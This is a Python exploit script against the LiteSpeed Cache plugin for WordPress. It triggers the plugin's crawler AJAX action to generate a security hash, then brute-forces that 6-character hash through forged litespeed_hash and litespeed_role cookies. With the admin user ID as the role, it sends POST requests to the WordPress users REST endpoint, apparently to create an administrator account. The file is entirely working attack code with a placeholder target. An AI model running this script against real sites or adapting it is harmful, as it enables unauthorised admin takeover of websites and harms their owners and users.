import requests
import random
import string
import itertools
import time

# Configuration
TARGET_SITE = "http://example.com/"
ADMIN_USER_ID = 1
TRIGGER_URL = f"{TARGET_SITE}/wp-admin/admin-ajax.php?action=async_litespeed&litespeed_type=crawler"
API_ENDPOINT = f"{TARGET_SITE}/wp-json/wp/v2/users"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}
COOKIE_NAME_HASH = "litespeed_hash"
COOKIE_NAME_ROLE = "litespeed_role"

def generate_random_string(length):
    """Generate a random string of fixed length."""
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))

def generate_possible_hashes():
    """Generate possible hash values based on weak seed."""
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    return (''.join(candidate) for candidate in itertools.product(charset, repeat=6))

def trigger_hash_generation():
    """Trigger the generation of the security hash."""
    response = requests.get(TRIGGER_URL, headers=HEADERS)
    if response.status_code == 200:
        print("[*] Security hash generated.")
        print("[*] Response Content:")
        print(response.text)  # Print response content for inspection
        return True
    else:
        print(f"[-] Failed to trigger hash generation: {response.status_code}")
        return False

def brute_force_hash():
    """Brute force the security hash."""
    total_attempts = 0
    for total_attempts, possible_hash in enumerate(generate_possible_hashes(), start=1):
        cookies = {
            COOKIE_NAME_HASH: possible_hash,
            COOKIE_NAME_ROLE: str(ADMIN_USER_ID)
        }
        response = requests.post(API_ENDPOINT, cookies=cookies, headers=HEADERS)
        
        if response.status_code == 201:
            print(f"[+] Success: Valid hash found - {possible_hash}")
            return possible_hash
        
        if total_attempts % 1000 == 0:  # Print progress every 1000 attempts
            print(f"[*] Progress: {total_attempts} attempts")
        
        # Debugging output
        print(f"[DEBUG] Attempt {total_attempts}: Hash {possible_hash} - Status {response.status_code}")

        # Sleep to avoid rapid-fire requests
        time.sleep(0.3)
    
    print("[-] Failed: No valid hash found after all attempts.")
    return None

if __name__ == "__main__":
    print("[*] Triggering security hash generation...")
    if trigger_hash_generation():
        print("[*] Starting brute-force attack...")
        valid_hash = brute_force_hash()
        
        if valid_hash:
            print(f"[+] Exploit successful with hash: {valid_hash}")
        else:
            print("[-] Exploit failed.")
    else:
        print("[-] Failed to trigger security hash generation.")
